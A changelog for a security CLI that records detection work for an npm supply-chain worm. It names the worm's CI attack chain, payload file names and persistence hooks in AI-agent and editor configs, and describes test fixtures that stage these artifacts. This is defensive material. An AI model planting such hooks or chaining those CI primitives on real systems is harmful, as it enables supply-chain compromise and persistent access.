The CI release workflow's `verify` step ran against the SOURCE tree (which had matching signatures + public key). It passed `38/38`. But the tarball that `npm publish` actually uploaded ended up with a different `public.pem` than the source tree. Verifying-on-source-tree is not the same as verifying-on-shipped-tarball. The mismatch went undetected for the entire v0.11.x and v0.12.x series.

### The fix

- `scripts/verify-shipped-tarball.js` — packs the package via `npm pack`, extracts the tarball to a temp dir, and runs Ed25519 verify against the **extracted tree**. Catches any divergence between source-tree state and shipped-tarball state. Logs both fingerprints (source vs. tarball) so any future mismatch is forensically obvious.
- Wired in as **the 14th predeploy gate** so local maintainers + CI both run it. A release that produces a broken tarball now blocks before `npm publish` instead of shipping silently.
- v0.12.3 re-signs every skill against the current public key, then runs the new gate to confirm the round-trip is clean.

### Other fixes

- **#137**: help text bumped from `v0.11.0 canonical surface` → `v0.12.0 canonical surface`.
- **#136 (text part)**: legacy-verb removal target moved from v0.12 → v0.13 in help text and deprecation banner. Actually removing the verbs is scope for a future release.
- **#135 (the run-with-no-evidence exit-0 case)**: deferred to v0.12.4. The fix is straightforward (have `run` exit 3 when classification: inconclusive AND no observations submitted, matching `ci`'s semantic) but changes the `run` verb's contract, which deserves a focused release that also documents the behavior change.

### Lesson codified in CLAUDE.md

"Verify-on-source-tree is not verify-on-shipped-tarball." Any project that signs artifacts must verify the EXACT bytes that downstream consumers receive, after `npm pack` (or equivalent packaging step). The next-easiest place to lose integrity is the file-set transformation between `git checkout` and the registry upload — and that transformation runs in CI, where the maintainer has the least visibility.

## 0.12.2 — 2026-05-13

**Patch: end-to-end scenario gate — staged-IoC harness in release workflow.**

366 unit tests prove the engine works in isolation. They don't prove that, given a real repo containing a CVE-2026-45321 payload file in `node_modules/@tanstack/`, the CLI actually catches it. v0.12.2 adds that gate.

### What ships

- `tests/e2e-scenarios/` — eight self-contained scenarios. Each is a directory holding a synthetic file tree (`fixtures/`), an evidence JSON, and an expectation JSON. The runner copies the fixture tree into a temp dir, runs the declared CLI verb against it, and diffs the result.

  | # | Scenario | What it stages | Asserts |
  |---|---|---|---|
  | 01 | clean-repo | nothing | `classification: not_detected`, `compliance_theater: clear` |
  | 02 | tanstack-worm-payload | `node_modules/@tanstack/react-router/router_init.js` | `detected` + jurisdiction clock starts |
  | 03 | claude-session-start-hook | `.claude/settings.json` with `hooks.SessionStart` running `.vscode/setup.mjs` | `detected` |
  | 04 | vscode-folder-open-task | `.vscode/tasks.json` with `runOptions.runOn: folderOpen` | `detected` |
  | 05 | ci-cache-coresidency | `.github/workflows/` containing `pull_request_target` + `id-token: write` + shared `actions/cache` | `detected` |
  | 06 | npmrc-no-cooldown | `package.json` with deps + no `.npmrc` cooldown | `inconclusive` (hardening recommendation) |
  | 07 | cve-curation | invoke `refresh --curate` on a real human-curated entry | refusal with `human-curated` error |
  | 08 | refresh-advisory | invoke `refresh --advisory` against an offline GHSA fixture | draft seed emitted, exit 3 |

- `scripts/run-e2e-scenarios.js` — iterates scenarios, supports `--filter=<regex>` + `--json`. Returns non-zero on any failure.
- `docker/test.Dockerfile` — new `e2e` target so the harness runs identically in CI containers and on a developer host (`npm run test:docker:e2e`).
- `npm run test:e2e` — local invocation (no Docker required).

### Release-workflow integration

`.github/workflows/release.yml` now runs `npm run test:e2e` immediately after `npm run predeploy` and before `npm pack` / `npm publish`. A regression that breaks any playbook's detection layer — even one that passes every unit test — blocks the publish.

### Coverage matrix

| Surface | Covered |
|---|---|
| `run sbom` with real IoC fixtures | scenarios 01-06 |
| `refresh --advisory` (offline fixture path) | scenario 08 |
| `refresh --curate` (human-curated refusal path) | scenario 07 |
| Exit-code semantics (0 / 2 / 3) | every scenario asserts `expect_exit` |
| `phases.detect.classification` + `phases.close.jurisdiction_notifications` | scenarios 02-05 |

Surface gaps to add in subsequent patches: `ai-run --stream` (JSONL contract), `attest verify` + `attest diff` against staged attestations, `doctor` with mock signature failures, `discover` against staged cwds.

## 0.12.1 — 2026-05-13

**Patch: README + website docs for the v0.12.0 freshness surface.**

v0.12.0 shipped the GHSA source + `refresh --advisory` + `refresh --curate` but the README operator section + the website still showed the v0.11.x command set. v0.12.1 brings the docs into line:

- README: refresh command reference now lists `--network`, `--advisory <CVE-or-GHSA-ID>`, `--curate <CVE-ID>`, `--prefetch`, and the `ghsa` source. Operator section command examples updated. New `EXCEPTD_GHSA_FIXTURE` + `EXCEPTD_REGISTRY_FIXTURE` env vars documented.
- Website: "nightly upstream refresh" feature card extended to mention GHSA as the minutes-old disclosure path (vs days for KEV / NVD). Operator persona card command list updated to show the advisory + curate workflow.

No CLI / catalog / playbook changes — pure docs.

## 0.12.0 — 2026-05-13

**Minor: catalog freshness from minutes-old disclosures, not days.**

Today's refresh sources (KEV / NVD / EPSS / IETF / MITRE) don't see a fresh-disclosure npm worm. KEV listing takes days; NVD takes ~10 days. The CVE-2026-45321 TanStack worm was caught publicly within 20 minutes — but the only feed that fired in that window was the GitHub Advisory Database. v0.12.0 adds GHSA as a refresh source, plus operator-driven single-advisory seeding, plus an editorial-enrichment helper.

### GHSA as a refresh source

`exceptd refresh` now pulls from GitHub Advisory Database (covers npm, PyPI, RubyGems, Maven, NuGet, Go, Composer, Swift, Erlang, Pub, Rust). Unauthenticated 60 req/hr; authenticated 5000 req/hr via `GITHUB_TOKEN` env var. New CVE IDs land as **drafts** flagged `_auto_imported: true` + `_draft: true`. The strict catalog validator treats drafts as warnings, not errors — so the nightly auto-PR pipeline can ship them without blocking on editorial review. Framework gaps + IoCs + ATLAS/ATT&CK refs are explicit nulls awaiting human or AI-assisted enrichment.

(Note: npm Inc. does not publish a standalone JSON advisory feed; npm advisories are surfaced via GHSA. Adding `npm-advisories` as a separate source would duplicate GHSA data with no fidelity gain.)

### `exceptd refresh --advisory <id>`

Operator-driven single-advisory seeding. Accepts CVE-* or GHSA-* identifiers. Fetches the advisory from GHSA, normalizes to the catalog draft shape, prints (default) or writes (`--apply`). Always exits **3** ("draft prepared, editorial review pending") so CI pipelines surface the next step.

```
exceptd refresh --advisory CVE-2026-45321               # dry-run, prints draft
exceptd refresh --advisory CVE-2026-45321 --apply       # writes draft into data/cve-catalog.json
exceptd refresh --advisory GHSA-xxxx-xxxx-xxxx --json   # JSON output
```

Refuses to overwrite a human-curated entry. Honors `EXCEPTD_GHSA_FIXTURE` env var for offline tests.

### `exceptd refresh --curate <CVE-ID>`

Editorial-enrichment helper. Reads the draft entry from `data/cve-catalog.json`, cross-references against `data/atlas-ttps.json` + `data/attack-ttps.json` + `data/cwe-catalog.json` + `data/framework-control-gaps.json`, and emits structured **editorial questions** — one per null field — each with ranked candidates and a specific ASK for the reviewer.

```
{
  "editorial_questions": [
    {
      "field": "atlas_refs",
      "current_value": [],
      "candidates": [{"id": "AML.T0010", "score": 68, "reason": "..."}],
      "ask": "Which MITRE ATLAS techniques are present in the attack chain?"
    },
    {
      "field": "framework_control_gaps",
      "ask": "Which framework controls CLAIM to cover this CVE's category, and where do they fall short? Per AGENTS.md Hard Rule #6, every framework finding must include a test that distinguishes paper compliance from actual security."
    },
    ...
  ]
}
```

Pure heuristic — deterministic keyword-overlap scoring against existing catalogs. The reviewer (human or AI assistant) makes the final call on each candidate. Always exits **3** because editorial review is, by definition, pending.

(The natural-language form `exceptd run cve-curation --advisory <id>` — wrapping this helper in a full seven-phase playbook with GRC closure — is scoped for v0.13. The helper itself ships in v0.12 so operators can use it now.)

### Catalog schema

- `data/cve-catalog.json` entries may now carry `_auto_imported`, `_draft`, `_draft_reason`, `_source_ghsa_id`, `_source_published_at` fields.
- `lib/validate-cve-catalog.js` recognizes drafts: prints them as `DRAFT` lines (not `FAIL`), does not exit-fail. The summary line includes a `<N> draft(s) (auto-imported)` count.
- `lib/schemas/cve-catalog.schema.json` is unchanged; the draft fields are absorbed by `additionalProperties: true`.

### Tests

7 new regression cases. 366 total. Coverage: ghsa fixture fetch, advisory normalization (draft shape + cisa_kev_pending heuristic for critical), `refresh --advisory` dry-run + apply paths, `refresh --curate` editorial-question generation, refusal-on-human-curated, validator draft-tolerance.

### Operator workflow

The end-to-end flow for a fresh-disclosure CVE the nightly job hasn't caught yet:

```
$ exceptd refresh --advisory CVE-2026-XXXXX --apply       # seeds draft from GHSA
$ exceptd refresh --curate CVE-2026-XXXXX                  # surfaces editorial questions + candidates
# review the questions, fill the catalog entry, add a zeroday-lessons.json entry,
# remove _auto_imported and _draft flags, then:
$ npm run predeploy                                        # strict gate now passes
```

The nightly auto-PR mechanism handles the GHSA pull automatically; this surface is for "I want this CVE today, not tomorrow."

## 0.11.15 — 2026-05-13

**Patch: CVE-2026-45321 (Mini Shai-Hulud TanStack npm worm) — catalog + playbook + IoC sweep.**

Adds detection for the npm supply-chain worm disclosed 2026-05-11 (84 malicious versions across 42 `@tanstack/*` packages, including `@tanstack/react-router` at ~12M weekly downloads, CVSS 9.6). The novel category: first documented npm package shipping VALID SLSA provenance while being malicious. Provenance proves which pipeline built the artifact, not that the pipeline behaved as intended.

### Catalog

- `data/cve-catalog.json` — new entry `CVE-2026-45321` with full RWEP scoring (78), the three chained primitives (`pull_request_target` co-resident with `id-token: write` and shared `actions/cache`), payload IoCs, persistence IoCs (`.claude/settings.json` SessionStart hooks, `.vscode/tasks.json` folder-open hooks, macOS LaunchAgents, Linux systemd-user units), framework-gap analysis (SLSA L3 insufficient, NIST 800-218 SSDF PS.3/PO.3 gap), and the destructive-on-revocation behavior.

### Playbook detections (sbom)

- `tanstack-worm-payload-files` — find `node_modules/@tanstack/*/router_init.js` or `router_runtime.js`
- `tanstack-worm-resolved-during-publish-window` — lockfile entries resolved 2026-05-11T19:20Z..19:26Z
- `agent-persistence-claude-session-start-hook` — non-owner SessionStart hooks
- `agent-persistence-vscode-folder-open-task` — folder-open tasks running staged setup scripts
- `agent-persistence-os-level` — macOS LaunchAgents + Linux systemd-user units referencing in-repo `.mjs`
- `ci-cache-poisoning-co-residency` — repo has `pull_request_target` + `id-token: write` + shared `actions/cache` (architectural pre-condition, even without payload)
- `npm-registry-no-cooldown` — project consumes npm but `.npmrc` lacks `before=` or `minimumReleaseAge=`

### Playbook detections (mcp)

- Same `agent-persistence-*` indicators on the agentic-tooling side. MCP playbook covers the persistence vector; SBOM covers the supply-chain root.

### Skill update

- `skills/supply-chain-integrity/SKILL.md` — adds the CVE-2026-45321 case at the top of Threat Context with the chained-primitives explanation and the new SLSA-L3-insufficient framing.

### Eating own dogfood

- `.npmrc` — adds `before=72h` + `minimumReleaseAge=4320` so this repo refuses fresh-publish installs. Survives downgrade to older npm via both flags.

### threat_currency_score bumps

- `sbom` 95 → 97, `mcp` 96 → 97, both with `last_threat_review: 2026-05-13`.

## 0.11.14 — 2026-05-13

**Patch: items 129-134 + freshness surface — claims-vs-reality gap closure + opt-in registry-check.**

### New: freshness surface (all opt-in, all offline-safe)

- **`doctor --registry-check`.** Queries the npm registry for the latest published version + publish date. Reports `local_version`, `latest_version`, `days_since_latest_publish`, and a `behind` / `same` / `ahead` flag. Routed through a child process so the call is bounded by a hard timeout; offline degrades to a structured warning, not a hang. Opt-in: doctor without the flag stays offline.

- **`run --upstream-check`.** Same registry call, fires before phase-4 detect. Surfaces an `upstream_check` block on the run result + a visible stderr warning when the local catalog is behind. Operators wiring CI gates can read `result.upstream_check.behind` to decide whether to trust today's findings. Doesn't fetch the catalog — only compares timestamps.

- **`refresh --network`.** Fetches the latest signed catalog snapshot from the maintainer's npm-published tarball, verifies every skill's Ed25519 signature against the `keys/public.pem` already in the operator's install, and swaps `data/` + `skills/` + `manifest.json` in place. Same trust anchor as `npm update -g`; only the data slice changes, so CLI/lib code stays pinned. Refuses the swap on public-key fingerprint mismatch (key rotation requires explicit `npm update -g` so the trust transition is auditable). Refuses when the install dir isn't writable (typical global installs) and points operators at `npm update -g` instead. Includes `--dry-run` for verifying signatures without applying. Backs up the prior `data/` to a timestamped dir so rollback is one `mv` away.

All three honor `EXCEPTD_REGISTRY_FIXTURE` env var (path to a JSON file mimicking the registry response) so test runners and air-gapped operators can exercise the freshness paths offline.

### Bugs

- **#129 air-gap workflow is now operator-accessible.** Pre-0.11.14 the docs implied `refresh --from-cache` worked offline but the cache-population path wasn't surfaced; an empty cache produced a stack trace. Now `refresh --prefetch` is the operator-facing alias for the prefetch script (legacy `--no-network` retained). Missing-cache errors emit a structured hint that names the exact command: "(1) on connected host: `exceptd refresh --prefetch`, (2) copy `.cache/upstream/`, (3) offline: `exceptd refresh --from-cache --apply`." Help text rewritten to document the workflow.

- **#130 `exceptd path copy` writes to the clipboard.** Previously the `copy` argument was silently consumed and the path was just printed — operators wondering "did anything happen?" had no signal. Now the verb invokes the platform clipboard tool (`clip` on Windows, `pbcopy` on macOS, `wl-copy` / `xclip` / `xsel` on Linux), confirms the copy on stderr, and still prints the path on stdout so shell consumers like `cd "$(exceptd path)"` continue to work. When no clipboard tool is available, a clear warning fires instead of a silent fallthrough.

- **#131 `run <skill-name>` suggests the right playbook.** 13 playbooks vs 38 skills with a many-to-many relationship: operators routinely typed `run kernel-lpe-triage` (a skill) and got "Playbook not found." Now the error names the playbook(s) that load the skill (e.g. `kernel`), distinguishes skill-vs-playbook semantics, and suggests both `exceptd run <playbook>` (execute) and `exceptd skill <name>` (read). Near-matches on unknown ids also surface (`run secret` → "Did you mean: secrets?"). Landing site updated to clarify the distinction near the skills grid.

- **#134 `ci` exit-code matrix puts BLOCKED before FAIL.** Pre-0.11.14 a preflight halt produced exit 2 (FAIL) — indistinguishable from "playbook detected a real problem." Operators wiring CI gates against `exit 2` couldn't separate "we never executed" from "we executed and found something." Now the precedence is BLOCKED (4) → FAIL (2) → NO-DATA (3) → PASS (0). The earlier `if (fail)` short-circuit was rearranged so blocked counts take precedence.

### Website (operator-facing)

- **#132** `exceptd build-indexes` references replaced with `exceptd refresh --indexes-only`.
- **#133** "13-gate predeploy" feature card relabeled "13-gate release hygiene" and explicitly disambiguated from the operator-facing `exceptd ci` verb.
- **#131** Skills grid header clarifies "skills are read-only; playbooks execute" with the three relevant verbs.
- **#129** Operator persona card shows the actual air-gap workflow: `refresh --prefetch` → copy → `refresh --from-cache --apply`.

### Tests

7 new regression cases. Notable: `#125/#134` now triggers a REAL preflight halt by submitting `repo-context: false` keyed by playbook id (autoDetectPreconditions can't override an explicit submission), and asserts `r.status === 4` not just non-zero — the earlier test only caught "not 0" which the v0.11.12 "fix" passed by coincidence (no-evidence → exit 3, also non-zero).

## 0.11.13 — 2026-05-13

**Patch: the final two stragglers — universal `ok:false` exit and empty-submission diff counters.**

### Bugs

- **#127 (originally #100) — `ok:false` body always yields non-zero exit.** Pre-0.11.13 several verbs emitted a result body with `ok: false` to stdout but didn't set `process.exitCode`, so `exceptd run ...; echo $?` returned 0 and `set -e` shell scripts couldn't gate on it. The previous fix was per-verb. Now `emit()` itself sets `process.exitCode = 1` whenever the body has `ok: false` at top level (unless a caller already set a different non-zero code). Universal contract: anything that emits `ok: false` to stdout OR stderr returns non-zero, no exceptions. New verbs cannot regress this — the catch is at the renderer.

- **#128 (originally #102) — attest diff falls back to playbook catalog when submissions are empty.** Pre-0.11.13 `attest diff` between two identical empty-submission attestations reported `status: unchanged` (hash equality) but `total_compared: 0, unchanged_count: 0` — operators couldn't tell whether "0 unchanged" meant "diff didn't iterate" or "nothing to compare." Now: when a submission has neither `artifacts` nor `observations`, the diff helper falls back to the playbook's `look.artifacts` catalog (via the attestation's stored `playbook_id`). Result: `total_compared` reflects the catalog size; `unchanged_count` equals `total_compared` when both sides are uniformly empty. Real observation submissions retain the prior behavior.

### Tests

3 new regression cases. The `#127` test asserts the universal contract by hitting `attest verify` on a non-existent session id and checking that any `ok:false` body (stdout or stderr) maps to non-zero exit. The `#128` test runs two `{}` submissions through `run sbom` and asserts the diff reports `total_compared > 0` matching `unchanged_count`.

## 0.11.12 — 2026-05-12

**Patch: items 123-126 — content-not-just-shape, exit-code discipline, diff iteration.**

Pattern: previous releases shipped the right field names but with empty content (notifications array existed but every entry's metadata was null), and exit-code semantics didn't cover the gates operators actually wanted to wire.

### Bugs

- **#123 jurisdiction notification entries carry obligation metadata.** Pre-0.11.12 `phases.close.jurisdiction_notifications` produced the right count of entries but each entry shape was `{ obligation_ref, recipient, draft_notification, deadline, ... }` — no `jurisdiction`, no `regulation`, no `window_hours`. The upstream `govern.jurisdiction_obligations` had the real metadata but close didn't carry it forward. Now each notification entry includes `jurisdiction`, `regulation`, `obligation_type`, `window_hours`, `clock_start_event`, `clock_started_at`, `deadline`, `notification_deadline` (alias matching compliance-team vocabulary), and `evidence_required`. Operators running `exceptd ci --block-on-jurisdiction-clock` now get notifications with the metadata they need to route to regulators and put on calendars.

- **#124 `--ack` propagates into `phases.govern.operator_consent`.** Consent semantically belongs in govern (it acknowledges the jurisdiction obligations surfaced there). Pre-0.11.12 `--ack` set only `result.operator_consent` at the top level; the govern phase showed `null`. Now `phases.govern.operator_consent` is `{ acked_at, explicit: true }` when `--ack` is passed, `null` otherwise. Top-level `result.operator_consent` retained for backward compat.

- **#125 ci exit-code matrix covers BLOCKED.** Pre-0.11.12 ci returned 0 for every non-detected path including blocked runs that never executed (preflight halt, mutex contention, stale threat intel, missing precondition). CI gates couldn't distinguish "ran clean" from "didn't run." Now: `0 PASS`, `2 detected/escalate`, `3 ran-but-no-evidence`, `4 BLOCKED (any ok:false)`, `1 framework error`. BLOCKED takes precedence over no-data because it's a harder gate failure. Help text updated.

- **#126 attest diff iterates artifact sets correctly.** Pre-0.11.12 `total_compared` was always 0 on flat-shape submissions because the diff helper called `normalizeSubmission` with an empty playbook stub (`look.artifacts: []`), producing empty maps. Now the diff loads the real playbook from each attestation's `playbook_id` and normalizes against the actual artifact catalog; falls back to direct observation-key mapping when the playbook can't be loaded (renamed/removed). Identical submissions with N observations now correctly report `total_compared: N, unchanged_count: N`.

### Tests

5 new regression cases. Tests assert content shape, not just field presence — every test that checks for a notification array now also asserts the entries carry non-null jurisdiction/regulation/window_hours.

## 0.11.11 — 2026-05-12

**Patch: CI test-gate hotfix — emit-then-exit stdout flush.**

v0.11.10 #100 used `process.exit(3)` after writing the result JSON to stdout. When stdout is piped (CI, test harnesses, JSON consumers), Node's `process.exit()` can return before the buffered async write drains — so `--json` consumers saw empty stdout despite the structured emit. Fix: switch to `process.exitCode = N; return;` so the event loop ends naturally and stdout drains.

### Bugs

- **`ci` --json with exit 3 truncated output.** Tests passed locally but the GitHub Actions release workflow's test gate failed on `tests/operator-bugs.test.js:#103` ("ci output should be JSON") because the Linux runner exposed the flush race more reliably than Windows. Fixed in two places:
  - `cmdCi` exit 3 (no evidence + all inconclusive)
  - `cmdCi` exit 2 (FAIL)
  - `cmdRun` `--strict-preconditions` exit 1 (same shape; pre-existing latent risk)

### Tests

New regression: `#100/#103 ci exit-3 path still flushes JSON to stdout` — asserts both `r.status === 3` AND `tryJson(r.stdout)` parses. This is the test that would have caught v0.11.10 before CI.

## 0.11.10 — 2026-05-12

**Patch: items 119-122 — field-name alignment with operator expectations.**

Several "broken" items were actually present-under-a-different-name. v0.11.10 adds the missing aliases + tightens ci's empty-evidence semantic.

### Bugs

- **#119 `result.ack` alias.** v0.11.9 surfaced `--ack` as `result.operator_consent.explicit`. Operators reading `result.ack` (matching the flag name) saw `undefined` and concluded the flag was dropped. Now: `result.ack` is a top-level boolean mirroring the consent state. `operator_consent.explicit` retains its richer shape.

- **#100 ci with no evidence exits 3.** Pre-0.11.10 `ci --required <pb>` with NO `--evidence`/`--evidence-dir` ran every playbook to inconclusive and exited 0 — operators couldn't distinguish "ran clean" from "never had real data." Now: when no evidence was supplied AND every result is inconclusive, ci exits **3** with a clear stderr warning: "ran but never had real data. Pass --evidence <file> or --evidence-dir <dir>." Exit code matrix: 0 PASS, 2 FAIL (detected/escalate), 3 NO-DATA, 1 framework error.

- **#102 `total_compared` field on attest diff.** Pre-0.11.10 `unchanged_count: 0 + added: 0 + removed: 0 + changed: 0` was ambiguous ("0 unchanged of how many?"). Now both `artifact_diff` and `signal_override_diff` include `total_compared` (set size of the union of both sides' keys). Operators can distinguish "no comparison happened" (total_compared: 0) from "everything matched" (total_compared: N, unchanged_count: N).

- **#104 `phases.close.jurisdiction_notifications` alias + `jurisdiction_clocks_count`.** The runner emitted `notification_actions`; operators expected `jurisdiction_notifications`. Now both names point to the same array (full list), and `jurisdiction_clocks_count` mirrors the ci-aggregate count of notifications whose clock has actually started. Compliance teams reading `phases.close.jurisdiction_notifications.length` (or filtering by `.clock_started_at != null`) get the expected shape.

### Tests

5 new cases in `tests/operator-bugs.test.js` for items 119/100/102/104.

## 0.11.9 — 2026-05-12

**Patch: items 99-115 — CLI-shim audit, real fixes.**

The CLI shim layer between arg parsing and result rendering was the common root cause across 8 releases of "fixed" bugs that operators kept re-finding. v0.11.9 audits that layer end to end.

### Critical

- **#99 default human output, unconditionally.** Pre-0.11.9 default was conditional on `process.stdout.isTTY`. Under most automation harnesses (Claude Code's Bash tool, GitHub Actions, CI runners, subprocess pipes) `isTTY` is false, so operators saw JSON everywhere "default human" was advertised. Now: when a human renderer is supplied AND no `--json`/`--pretty`/`--json-stdout-only` is passed, emit human. `--json` to opt back into JSON. Closes the longest-standing UX gap.

### Bugs

- **#100 cmdRunMulti exits non-zero on any blocked run.** Pre-0.11.9 the aggregate result had `{ok: false}` in the body but exit code stayed 0 for multi-playbook runs (cmdRunMulti was missing the exit-non-zero gate that cmdRun had). CI gates couldn't distinguish "ran clean" from "any blocked." Now: cmdRunMulti checks `results.some(r => r.ok === false)` and exits 1 when true, matching cmdRun's single-playbook contract.

- **#113 `--operator` surfaces in run result top-level.** Pre-0.11.9 `--operator` was persisted to the attestation file but the run result didn't echo it back. Operators thought the flag was dropped. Now: `result.operator = runOpts.operator` so `exceptd run … --operator … --json | jq .operator` returns the supplied value.

- **#114 `--ack` surfaces in run result top-level.** Same shape as #113. `result.operator_consent = { acked_at, explicit: true }` echoes back in the run result.

- **#115 `ci --required <list>` actually filters.** Pre-0.11.9 the flag was silently ignored — `ci --required secrets,sbom` ran the default scope set anyway. Now: `--required` takes precedence over `--scope` and `--all`, runs exactly the named set, rejects unknown playbook IDs with a structured error.

- **#102 `attest diff` unchanged_count for identical hashes** — already fixed in v0.11.8 (verified by new regression test in this release).

- **#104 jurisdiction clocks on detected** — verified working: `ci --required secrets --evidence <detected-submission>` returns `jurisdiction_clocks_started: 3` (for secrets' 3 detect_confirmed obligations). The user's earlier report was on a pre-canonicalize-fix version where `detection_classification: detected` wasn't propagating.

### Tests

5 new cases for items 104, 113, 114, 115.

## 0.11.8 — 2026-05-12

**Patch: items 99-104 + new regression tests.**

### Critical

- **#99 default human-readable output for `brief` + `run`.** Closed across 8 releases of operator reports. `emit()`'s third arg now accepts a human renderer; both verbs supply one. When stdout is a TTY and no `--json`/`--pretty` is passed, operators get a digest (jurisdictions + threat context + RWEP threshold + required/optional artifacts + indicators for `brief`; classification + RWEP delta + matched CVEs + indicator hits + remediation + notification clocks for `run`). Piped output stays JSON for AI consumers and CI scripts.

- **#103 CI no longer fails on inconclusive baseline RWEP.** Fresh-repo `ci --scope code` with no operator evidence previously exited 2 with `fail_reasons: ["sbom: rwep=90 >= cap=80"]` because catalog-baseline RWEP exceeded the default cap. The asymmetry between operator expectation ("no evidence = no fail") and tool behavior ("inconclusive ≠ pass") was the biggest first-impression surprise. Fix: only RWEP DELTA (adjusted - base) counts against the cap on inconclusive classifications. Detected classifications still gate on absolute RWEP. Baseline + zero evidence → PASS.

### Bugs

- **#101 `ai-run --no-stream` shape unified with `run`.** Both now return `{ok, playbook_id, directive_id, session_id, evidence_hash, phases: {govern, direct, look, detect, analyze, validate, close}}`. Pre-0.11.8 ai-run flattened phases to top-level while `run` nested them — operators writing JSONPath had to know which verb produced the payload.

- **#102 `attest diff` `unchanged_count` now correct.** Two issues fixed: (a) the diff function had a branch that prevented counting both-sides-present-and-identical entries; (b) the diff didn't normalize flat-shape submissions, so artifact comparisons against `undefined` returned 0 even for non-empty observations. Now: submissions are normalized via the runner's `normalizeSubmission` before comparison, and identical entries correctly increment the counter.

- **#100 exit code contract** — verified correct + locked with regression tests. `result.ok === false` → exit 1 (preflight halt). `result.ok === true` with warn-level preflight_issues → exit 0 (run completed). `--strict-preconditions` escalates warn-level to exit 1 (already shipped v0.11.6). Three named test cases lock the contract in.

### Tests

6 new regression cases for items 99-103 in `tests/operator-bugs.test.js`.

## 0.11.7 — 2026-05-12

**Republish of v0.11.6 (which failed CI publish). Adds CI publish-gate fix.**

### CI fix

v0.11.6 tag was pushed but the release workflow failed publishing to npm. Root cause: `prepublishOnly` re-ran `predeploy`, which re-ran the Ed25519 signature verify gate. The standalone `Predeploy gate sequence` workflow step had already validated everything with one public key fingerprint (`JX04Vj…`); the second invocation during `npm publish`'s prepublishOnly hook reported a different fingerprint (`M/r52u…`) for the same tracked `keys/public.pem`, causing every skill signature to fail verification.

The fingerprint divergence between two same-process invocations of the same binary against the same on-disk file remains unexplained (no script writes to `keys/public.pem` between the two runs). Pragmatic fix: the standalone Predeploy step is the authoritative safety net for CI publishes; the workflow now sets `EXCEPTD_SKIP_PREPUBLISH_PREDEPLOY=1` and prepublishOnly skips its redundant predeploy run. Local `npm publish` invocations still run predeploy because the env var is only set inside the workflow's publish step.

### What's in this release

All v0.11.6 changes:

- **#91** CSAF + OpenVEX include framework_gap_mapping (was: empty bundles for posture-only playbooks)
- **#92** CSAF tracking.current_release_date populated (spec §3.2.1.12)
- **#93** SARIF rule definitions for every referenced ruleId (spec §3.27.3)
- **#94** lint missing_required_artifact downgraded error → warn (align with runner)
- **#95** default human-readable output for `attest list` + `lint` on TTY
- **#96** `--strict-preconditions` flag escalates warn-level preconditions to exit 1
- **#97** `doctor --fix` runs before JSON early-return (was no-op in `--json` mode)
- **#98** `attest export` + `report` validate `--format` against accepted set

### Workflow improvement

README + landing-site updates are now part of every release sequence. README v0.11 section + exceptd.com softwareVersion updated alongside the package version bump.

## 0.11.6 — 2026-05-12

**Patch: items 91-98.**

### Critical

- **#91 CSAF + OpenVEX renderers excluded framework_gap_mapping.** SARIF already iterated it (added in v0.11.5); the other two formats diverged. Now: both CSAF and OpenVEX emit one vulnerability / statement per framework gap, keyed under `exceptd-framework-gap` (CSAF) / `exceptd:framework-gap:<framework>:<control>` (OpenVEX) pseudo-CVE namespaces. All three formats now share the same findings-extraction layer (CVEs + indicators + framework gaps).

### Bugs

- **#92 CSAF current_release_date null.** CSAF 2.0 §3.2.1.12 requires this field non-null; downstream validators rejected the bundle. Set to `initial_release_date` (same value, satisfies the spec).
- **#93 SARIF references ruleIds without rule definitions.** SARIF spec §3.27.3: every referenced `ruleId` must have a corresponding entry in `tool.driver.rules`. Pre-0.11.6 SARIF referenced `framework-gap-0`/`framework-gap-1`/etc but only defined rules for indicator hits and matched CVEs. GitHub Code Scanning + VS Code SARIF Viewer + Azure DevOps would warn or fail to display rule context. Now: one rule definition per framework gap including the gap text and required-control hint.
- **#94 lint stricter than runner.** Pre-0.11.6 lint reported `missing_required_artifact` as a hard error, but the runner accepted the same submission and ran with indicators returning `inconclusive`. Lint now warns (not errors) on missing required artifacts, with a hint explaining the run will still execute but inconclusively.
- **#95 default-output flip landed for `attest list` + `lint`.** When stdout is a TTY and no `--json`/`--pretty` is passed, both verbs now emit a human-readable table / summary. `brief` and `run` keep indented JSON because their data is too rich for a compact human view — operators wanting markdown digests use `--format markdown` (run) or read the brief structured.
- **#96 `--strict-preconditions` flag.** New on `run`: escalates warn-level preflight issues (unverified preconditions, `on_fail: warn`) to exit 1. Default (without the flag) preserves the v0.11.x behavior where warn-level preconditions are informational and exit 0. CI gates wanting "fail on any unverified precondition" pass this flag.
- **#97 `doctor --fix` was a no-op under `--json`.** The fix logic was placed AFTER the JSON early-return, so `--fix --json` never executed. Moved before the early-return; now generates the keypair and the returned JSON reflects the post-fix state (`summary.fix_applied: "ed25519_keypair_generated"`).
- **#98 `attest export --format garbage` + `report garbage` silently accepted.** Both now validate against the accepted set and emit structured JSON errors with exit non-zero, matching `run --format` / `ci --format` rejection.

### Test infrastructure

35 cases in `tests/operator-bugs.test.js` (8 new for 91-98). Future bug fixes continue to land here.

## 0.11.5 — 2026-05-12

**Patch: items 82-90 + permanent regression suite at `tests/operator-bugs.test.js`.**

Every operator-reported bug fixed across the v0.9.5 → v0.11.x arc now lands as a named test case in `tests/operator-bugs.test.js`. Re-introductions surface at `npm test`, not at user re-report. 27 cases on day one covering items #17, #18, #19, #31, #32, #33, #46, #58, #62, #65, #71, #73, #76, #82, #83, #85, #87.

### Critical

- **#82 SARIF / CSAF / OpenVEX rendered empty bundles** when the playbook had no catalogued CVEs. crypto-codebase / library-author have `domain.cve_refs: []` by design (they check process / posture, not catalogue CVEs), so the renderers had nothing to populate. Pre-0.11.5 a successful run with 9 indicators firing produced `vulnerabilities: 0` / `results: 0` / `statements: 0`. Now: indicators that fire (verdict: hit) and framework gaps are first-class SARIF results / CSAF vulnerabilities / OpenVEX statements. Each fired indicator becomes a SARIF result with `kind: indicator_hit` + a pseudo-CVE id under the `exceptd:` namespace for CSAF/OpenVEX. SARIF + CSAF + OpenVEX bundles now meaningfully integrate with GitHub Code Scanning / VEX downstreams / supply-chain tooling even for posture-only playbooks.

### Bugs

- **#83 lint and run disagreed on shape validity.** Lint walked the raw submission and only matched observations whose key was a known artifact id. The runner's `normalizeSubmission` followed `val.artifact` indirection — so observations with arbitrary keys (`obs-1`, `obs-2`) and an `artifact:` field route correctly. Fix: lint now runs the same `normalizeSubmission` the runner does, then validates the canonical normalized shape. The user's proposed fix — single observations-normalizer module that lint, run, and format renderers all consume — landed.

